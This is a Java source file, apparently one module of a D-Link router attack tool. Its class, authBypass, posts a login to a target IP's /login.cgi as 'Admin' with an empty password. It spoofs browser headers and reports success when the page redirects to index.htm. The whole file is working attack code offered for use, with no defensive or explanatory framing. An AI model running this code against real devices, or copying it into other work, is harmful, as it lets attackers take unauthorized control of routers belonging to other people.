/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package dlink;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

/**
 *
 * @author SUMAN
 */
public class authBypass {
    
    String ip;
    boolean stat;
    authBypass(String a)
    {
        ip=a;
    }
    public boolean deploy()
    {
        
        try{
        URL url = new URL("http://"+ip+"/login.cgi");
        String data="username=Admin&password=&submit.htm%3Flogin.htm=Send";
        byte[] dataBytes = data.getBytes("UTF-8");

        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Host", ip);
        conn.setRequestProperty("Referer","http://"+ip+"/login.htm");
        conn.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0");
	conn.setRequestProperty("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
	conn.setRequestProperty("Accept-Language","en-US,en;q=0.5");
	conn.setRequestProperty("Accept-Encoding","gzip, deflate");
	conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
	conn.setRequestProperty("Content-Length",String.valueOf(dataBytes.length));
	conn.setRequestProperty("Connection","keep-alive");
        conn.setDoOutput(true);
        OutputStream fout=conn.getOutputStream();
        fout.write(dataBytes);
        fout.close();
        InputStream fin=conn.getInputStream();
        StringBuilder sb=new StringBuilder();
        System.out.println("\nReceived:");
        while(fin.available()>0)
            sb.append((char)fin.read());
        fin.close();
        stat=sb.toString().contains("<body onload=\"window.location.href='index.htm';\">");

        }catch(Exception e){
           e.printStackTrace();
           stat=false;
        }
    return stat;
    }
}
